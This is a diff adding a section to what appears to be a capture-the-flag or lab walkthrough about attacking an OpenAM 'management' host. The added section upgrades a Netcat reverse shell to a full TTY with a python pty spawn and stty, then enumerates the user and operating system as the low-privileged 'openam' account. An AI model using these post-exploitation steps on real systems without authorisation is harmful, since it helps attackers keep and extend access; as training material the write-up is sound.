@@ -723,6 +723,41 @@ openam@management:/$
 **Next:** Stabilize the raw shell into a full TTY, then enumerate the local system.
 <div align="center">
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 3.5 Stabilize the shell and establish context
+
+**Why this step:** A raw Netcat shell lacks job control and a usable TTY. Upgrade it, then confirm the current user, host, and OS before enumerating.
+
+**Commands:**
+
+```shell
+# in the reverse shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+export SHELL=/bin/bash
+# Ctrl+Z, then on the attack box:
+stty raw -echo; fg
+# press Enter twice
+id; hostname; cat /etc/os-release | head -2
+```
+
+**Result:**
+
+```
+uid=996(openam) gid=987(openam) groups=987(openam)
+management
+PRETTY_NAME="Ubuntu 24.04.5 LTS"
+```
+
+**What this gives you:** A stable TTY as a low-privileged service account. **Key finding:** you are `openam` (uid 996), a dedicated service user with no extra group memberships, on Ubuntu 24.04. This is an unprivileged foothold; privilege escalation will require pivoting to a real user.
+
+**Next:** Enumerate local users and the `/opt` directory to find what else this server runs.
+<div align="center">
+<br>
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
